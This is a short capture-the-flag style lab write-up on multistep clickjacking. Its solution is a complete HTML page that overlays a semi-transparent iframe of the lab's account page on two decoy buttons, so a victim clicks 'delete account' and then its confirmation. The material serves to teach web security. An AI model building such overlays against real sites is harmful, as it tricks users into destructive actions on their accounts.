# Multistep clickjacking

## Description

Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy. 

## Task 

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog. You will need to use two elements for this lab. 

## Solution

```xml
  <html>
  <head>
    <style>
      #target_website {
        position: relative;
        width: 500px;
        height: 280px;
        opacity: 0.50000001;
        z-index: 2;
        top: -250px;
        left: -20px;
      }
     
     .firstClick, .secondClick {
         position:absolute;
         top: 10px;
         left: 30px;
         z-index: 1;
     }
     
     .secondClick {
         left: 192px;
     }
    </style>
  </head>
  <body>
     <div class="firstClick"><button>first</button></div>
     <div class="secondClick"><button>second</button></div>
    <iframe id="target_website" src="https://accd1f1a1f233e72803a028b00a400fd.web-security-academy.net/account">
    </iframe>
  </body>

  </html>
```